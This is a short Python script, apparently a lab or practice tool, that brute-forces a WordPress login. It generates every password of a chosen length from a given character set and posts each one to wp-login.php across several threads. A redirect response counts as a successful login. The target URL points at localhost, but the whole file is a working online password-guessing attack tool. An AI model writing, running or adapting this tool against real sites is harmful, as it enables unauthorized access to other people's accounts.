"""
------------------------------------
@Time : 2021/11/2 11:33
@Auth : DALONG
@File : bruter.PY
@IDE  : PyCharm
@Motto: Real warriors,dare to face the bleak warning,dare to face the incisive error!
@QQ   : 5962@qq.com
@GROUP: 5962
------------------------------------
"""
# !/usr/bin/env python
# -*- coding:utf-8 -*-
import queue
from queue import Queue

import requests
import sys
import itertools
# import Queue
import threading
import time
class Bruter(object):
    def __init__(self, user, characters, pwd_len, threads):
        self.user = user
        self.found = False # 存放破解结果，破解成功为True，失败为False
        self.threads = threads
        print('构建待测试口令队列中...')
        # self.pwd_queue = Queue.Queue()
        self.pwd_queue = queue.Queue()
        for pwd in list(itertools.product(characters, repeat=pwd_len)):
            self.pwd_queue.put(''.join(pwd))
        self.result = None
        print('构建成功!')
    def brute(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__web_bruter)
            t.start()
            print('破解线程-->%s 启动' % t.ident)
        while (not self.pwd_queue.empty()): # 剩余口令集判断
            sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)' % self.pwd_queue.qsize())
            sys.stdout.flush()
            time.sleep(1)
            print ('\n破解完毕')
    def __login(self, pwd):
        url = 'http://localhost/wordpress/wp-login.php'
        values = {'log': self.user, 'pwd': pwd, 'wp-submit': 'Log In',
                  'redirect_to': 'http://localhost/wordpress/wp-admin', 'test_cookie': '1'}
        my_cookie = {'wordpress_test_cookie': 'WP Cookie check'}
        r = requests.post(url, data=values, cookies=my_cookie, allow_redirects=False) # 禁用重定向，以便后边判断登陆状态
        if r.status_code == 302: # 登陆状态判断
            return True
        return False
    def __web_bruter(self): # 破解子线程函数
        while not self.pwd_queue.empty() and not self.found:
            pwd_test = self.pwd_queue.get()
            if self.__login(pwd_test):
                self.found = True
                self.result = pwd_test
                print ('破解 %s 成功，密码为: %s' % (self.user, pwd_test))
            else:
                self.found = False
if __name__ == '__main__':
    # if len(sys.argv) != 5:
    #     print(len(sys.argv))
    #     print ('用法 : cmd [用户名] [密码字符] [密码长度] [线程数]')
    #     exit(0)
    # b = Bruter(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
    print('sd ')
    b = Bruter('sdl', '123456', 6, 5)
    b.brute()
    print (b.result)